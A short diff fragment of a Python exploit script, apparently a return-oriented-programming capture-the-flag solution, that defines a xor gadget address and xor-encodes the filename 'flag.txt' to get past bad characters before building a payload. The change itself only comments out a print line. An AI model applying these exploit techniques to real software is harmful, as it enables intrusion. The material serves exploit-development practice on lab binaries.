@@ -10,7 +10,7 @@ xor = 0x08048547 # xor byte ptr [ebp], bl ; ret
 key = 0x2
 flag = bytes([ i^key for i in b"flag.txt" ])
 
-print(flag)
+#print(flag)
 
 # Writing encoded filename
 payload = b"".join([
